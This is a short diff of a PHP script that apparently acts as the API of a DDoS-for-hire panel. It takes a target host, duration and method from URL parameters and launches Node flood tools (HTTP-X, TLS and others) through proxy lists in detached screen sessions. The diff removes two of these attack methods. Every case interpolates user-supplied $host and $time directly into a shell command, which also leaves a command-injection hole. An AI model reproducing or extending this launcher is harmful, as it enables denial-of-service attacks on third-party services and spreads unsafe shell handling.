@@ -45,12 +45,6 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
         case 'HTTP-X':
             $command = "cd /var/www/html/test/ && screen -dm node HTTP-X $host $time 8 2 proxy.txt";
             break;
-        case 'QUANTUM':
-            $command = "cd /var/www/html/test/ && screen -dm node QUANTUM $host $time 8 2 proxy.txt";
-            break;
-        case 'FLOOD':
-            $command = "cd /var/www/html/test/ && screen -dm node flood $host $time 2 proxy.txt 8";
-            break;
         case 'TLS':
             $command = "cd /var/www/html/test/ && screen -dm node TLS $host $time 8 2 proxy.txt";
             break;
